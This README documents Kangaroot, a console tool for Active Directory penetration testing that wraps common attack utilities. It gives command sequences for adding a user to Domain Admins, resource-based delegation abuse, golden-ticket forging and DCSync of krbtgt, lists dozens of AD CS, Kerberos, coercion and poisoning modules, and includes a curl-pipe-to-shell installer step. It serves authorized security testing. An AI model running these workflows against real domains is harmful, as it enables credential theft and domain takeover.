# Kangaroot

![Kangaroot](assets/kangaroot.png)

Kangaroot is a Metasploit-style Textual TUI for Active Directory pen testing and red teaming. It wraps common AD tooling (Impacket, Certipy, BloodyAD, BloodHound CE, Responder, coercion scripts) behind a single interactive console with reusable options, credential management, and async job output panes.

## Features

- Dynamic module discovery and registration from `modules/`
- Metasploit-like operator flow: `list` -> `use` -> `show` -> `set` -> `run`
- Shared global variables (`setg`) and module-local options (`set`)
- SQLite-backed persistence for modules, options, credentials, globals, and command history
- Async command execution with job tracking (`jobs`, `stop <id>`) and multi-pane output
- Integrated credential workflow (`cred add/list/use/find/del`)
- Kerberos workflow helpers (`tgt`, `ptt`, `tickets`)
- Broad AD attack and enumeration module coverage (eEnumeration, AD CS ESC paths, delegation, Kerberos abuse, coercion, ACL abuse, DCSync, BloodHound collection, SMB helpers)

## Requirements

- Linux environment with standard AD operator tooling support
- `uv` installed and available in `PATH`
- Python `>=3.13` (as defined in `pyproject.toml`)
- Network access to domain targets/tools you intend to run

## Installation

### Automated setup (recommended)

This creates a virtual environment, installs project dependencies, installs tool entrypoints with `uv tool`, clones required external repos in `tools/`, and registers modules.

```bash
# If you haven't already, install uv
curl -LsSf https://astral.sh/uv/install.sh | sh

# Run the installation script
chmod +x install.sh
./install.sh
```

This is the only supported installation method as it will create the correct directory and tool structure. Everything is installed in a local uv environment, nothing gets placed outside of the root directory.

## Quickstart

```bash
# 1) Register all modules found in modules/
uv run main.py --register-modules

# 2) Confirm inventory
uv run main.py --list-modules

# 3) Launch TUI
uv run main.py
```

## Console Workflow

Core commands in the TUI:

- `list` - list registered modules
- `use <module/path>` - select a module
- `show` / `info` - show current module options and details
- `set <option> <value>` - set module option
- `unset <option>` - unset module option
- `setg <option> <value>` - set global option
- `unsetg <option>` - unset global option
- `globals` - show global variables
- `run` - execute selected module
- `cred <...>` - credential manager (`list`, `add`, `del`, `use`, `find`)
- `tgt` - request TGT for current credential-bearing module
- `ptt <ticket.ccache>` / `ptt list` / `tickets` - pass-the-ticket workflow
- `jobs` / `stop <id>` - monitor/stop running jobs
- `back` - deselect module
- `clear` - clear output panes

## Credential Manager

Use `cred` to store and reuse authentication sets instead of manually entering `username`, `password` (or nt hash), `domain`, and `auth` on every module. 

Typical flow is `cred add` to save a credential, `cred list` to view saved entries, `cred find <text>` to search, and `cred use <id|name>` to apply one to the active module.

Once selected, modules that support auth automatically consume the chosen credential values, so you only set module-specific target options before `run`.

## Example Usage

General usage flow:

```bash
# list modules
kangaroot > list

# choose a module
kangaroot > use enum/adcs

# show module options
kangaroot (enum/adcs) > show

# add auth credentials manually
kangaroot (enum/adcs) > set domain corp.local
kangaroot (enum/adcs) > set username lowpriv
kangaroot (enum/adcs) > set password <password or nt hash>

# or use a saved credential from the credential manager
kangaroot (enum/adcs) > cred list
kangaroot (enum/adcs) > cred 1

# or get a TGT for the current auth user
kangaroot (enum/adcs) > tgt

# switch auth to kerberos using the ticket obtained
kangaroot (enum/adcs) > set auth krb

# run the module
kangaroot (enum/adcs) > run

# you can also set global variables
kangaroot > setg domain corp.local
kangaroot > setg dc_ip 10.0.0.10

# unset a global variable
kangaroot > unsetg dc_ip

# unset a local (module) variable
kangaroot (enum/adcs) > unset username

# local variables takes precedence over globals. e.g
kangaroot (enum/adcs) > setg username malcolm # username for every module is now malcolm
kangaroot (enum/adcs) > set username lowpriv # username for this module is now lowpriv
kangaroot (enum/adcs) > unset username # username for this module is back to malcolm
```

### Example 1: ACL group membership abuse (`acl/addmember`)

```text
list
use acl/addmember
show
set domain corp.local
set username authuser
set password 'Summer2025!'
set target_user svc_web
set target_group "Domain Admins"
run
```

Or, to use the built-in credential manager:

```text
list
use acl/addmember
show
cred 1
set target_user svc_web
set target_group "Domain Admins"
run
```

Cleanup mode (remove membership):

```text
set cleanup yes
run
```

### Example 2: RBCD attack path (`delegation/rbcd`)

```text
use delegation/rbcd
set domain corp.local
set username attacker
set password 'Passw0rd!'
set target_computer_fqdn dc01.corp.local
set target_computer_account dc01$
set target_account Administrator
run
```

### Example 3: Forge a golden ticket (`kerberos/golden`)

```text
use kerberos/golden
set domain corp.local
set domain_sid S-1-5-21-111111111-222222222-333333333
set target_user administrator
set nthash 0123456789abcdef0123456789abcdef
run
```

Then load it into another credential-bearing module:

```text
ptt list
ptt administrator.ccache
```

### Example 4: DCSync (`creds/dcsync`)

```text
use creds/dcsync
cred 2
set target_user krbtgt
run
```

## Module Overview

To view the exact module list on your current build:

```bash
uv run main.py --list-modules
```

# Current module inventory

```bash
 kangaroot > list
  Available Modules:

  acl/
    addmember            - Add a user to a group. Requires GenericWrite on the target group.
    adminsdholder        - Read or write AdminSDHolder DACL entries using dacledit.
    genericall           - Add GenericAll from a chosen source user to a target account. Set cleanup=true to remove GenericAll instead.
    setpasswd            - Set a target account's password. Requires GenericAll / GenericWrite.
    setspn               - Add a SPN to a target account to make it kerberoastable. Requires GenericAll / GenericWrite.
    shadowcreds          - Shadow Credentials attack. Requires GenericAll / GenericWrite.
    writedacl            - Write a configurable DACL right on the target. Requires WriteDacl.

  adcs/
    certifried           - Certifried attack (CVE-2022–26923): AD CS Privilege Escalation
    esc1                 - ESC1: Enrollee-Supplied Subject for Client Authentication
    esc10                - ESC10: Weak Certificate Mapping for Schannel Authentication
    esc11                - ESC11: NTLM Relay to AD CS RPC Interface
    esc12                - ESC12: YubiHSM2 Vulnerability (Specific Context)
    esc13                - ESC13: Issuance Policy with Privileged Group Linked
    esc14                - ESC14: Weak Explicit Certificate Mapping
    esc15                - ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")
    esc16                - ESC16: Security Extension Globally Disabled on Certificate Authority
    esc2                 - ESC2: Misconfigured Certificate Template - Any Purpose EKU
    esc3                 - ESC3: Misconfigured Certificate Template - Certificate Request Agent EKU
    esc4                 - ESC4: Misconfigured Certificate Template - Writeable Configuration
    esc5                 - ESC5: Vulnerable PKI Object Access Control
    esc6                 - ESC6: CA Allows SAN Specification via Request Attributes
    esc7                 - ESC7: Dangerous Permissions on CA
    esc8_krb             - ESC8: Kerberos Relay to AD CS Web Enrollment
    esc8_ntlm            - ESC8: NTLM Relay to AD CS Web Enrollment
    esc9                 - ESC9: No Security Extension on Certificate Template
    goldencert           - Backup CA key material, forge a certificate for a target user, and optionally authenticate with it
    ptc                  - Pass The Cert - Authenticate with an existing PFX certificate

  auth/
    check                - Validate domain credentials and check local admin access on a target

  bloodhound/
    collect              - Run BloodHound CE collector and generate a compatible ZIP

  coercion/
    dfscoerce            - MS-DFSNM abuse (DFSCoerce)
    petitpotam           - MS-EFSR abuse (PetitPotam)
    printerbug           - MS-RPRN abuse (PrinterBug)
    shadowcoerce         - MS-FSRVP abuse (ShadowCoerce)

  creds/
    dcsync               - Perform a DCSync against a domain controller

  delegation/
    constrained          - Privilege Escalation via Constrained Delegation without Protocol Transition
    constrained_with_pt  - Privilege Escalation via Constrained Delegation with Protocol Transition
    rbcd                 - Privilege escalation via resource-based constrained delegation.
    unconstrained        - Privilege Escalation via Unconstrained Delegation.

  enum/
    acl                  - Enumerate potentially exploitable AD ACL misconfigurations via writable objects
    adcs                 - Enumerate ADCS CA to find vulnerable certificate templates
    delegation           - Enumerate delgations that could be abused (Constrained, Unconstrained, RBCD)
    dns_adidns           - Enumerate AD-integrated DNS records and highlight risky entries
    gmsa                 - Enumerate gMSA accounts and password retrieval exposure
    gpp_passwords        - Enumerate Group Policy Preferences cpassword secrets from SYSVOL
    laps                 - Enumerate legacy LAPS and Windows LAPS managed computers
    ldaps                - Enumerate LDAP signing and LDAPS channel binding posture
    policy               - Enumerate default domain password policy, FGPP, and MAQ
    privileged           - Enumerate privileged groups, nested members, and adminCount=1 objects
    trust                - Enumerate AD trust relationships and trust directions

  example/
    dual_cmd             - Example module - Ping two addresses simultaneously

  kerberos/
    asreproast           - AS-REP Roasting attack.
    golden               - Forge a Kerberos golden ticket.
    kerberoast           - Kerberoasting attack.
    silver               - Forge a Kerberos silver ticket.
    st                   - Request a Kerberos service ticket
    targets              - Enumerate Kerberos-relevant target accounts (SPN, AS-REP, delegation flags)
    tgt                  - Get a TGT for user authentication

  responder/
    capture              - Poison LLMNR, NBT-NS and mDNS lookups and catpure hashes
    relay                - Poison LLMNR, NBT-NS and mDNS lookups and relay authentication requests

  smb/
    client               - SMB Client module
```

## Persistence and Artifacts

- Main state DB: `kangaroot.db`
- Logs and generated artifacts: `logs/`
- Kerberos ccache tickets: `logs/*.ccache`

## Development

- Run app: `uv run main.py`
- Run with Textual dev mode: `uv run textual run --dev main.py`
- Re-register modules after adding/updating module files: `uv run main.py --register-modules`

## Legal

Use only in environments where you have explicit authorization. This tool orchestrates offensive AD actions and can cause service impact or security incidents when misused.
